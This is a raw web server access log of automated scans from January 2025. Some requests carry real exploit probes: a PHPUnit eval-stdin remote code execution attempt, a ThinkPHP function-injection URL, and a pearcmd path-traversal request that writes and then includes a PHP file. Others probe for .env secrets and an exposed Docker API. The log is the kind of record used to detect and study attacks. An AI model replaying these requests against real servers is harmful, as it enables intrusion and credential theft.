38.242.215.19 - - [18/Jan/2025:23:56:25 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:25 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:25 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:26 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:26 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:26 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:26 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
104.40.73.123 - - [18/Jan/2025:23:57:19 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
80.82.77.202 - - [09/Jan/2025:00:09:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (compatible; alexa site audit/1.0; +http://www.alexa.com/help/webmasters; )"
78.153.140.147 - - [09/Jan/2025:00:29:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [09/Jan/2025:00:29:52 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [09/Jan/2025:00:41:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.240.223.202 - - [09/Jan/2025:01:02:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
20.118.69.83 - - [09/Jan/2025:01:07:02 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
35.203.211.62 - - [09/Jan/2025:01:14:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
205.210.31.25 - - [09/Jan/2025:01:19:55 +0000] "\x16\x03\x01" 400 523 "-" "-"
205.210.31.25 - - [09/Jan/2025:01:19:56 +0000] "\x16\x03\x01" 400 523 "-" "-"
5.181.190.248 - - [09/Jan/2025:01:50:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
175.210.43.87 - - [09/Jan/2025:01:58:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
159.223.69.51 - - [09/Jan/2025:02:11:09 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [09/Jan/2025:02:11:14 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
152.42.247.210 - - [09/Jan/2025:02:11:41 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.247.210 - - [09/Jan/2025:02:11:45 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
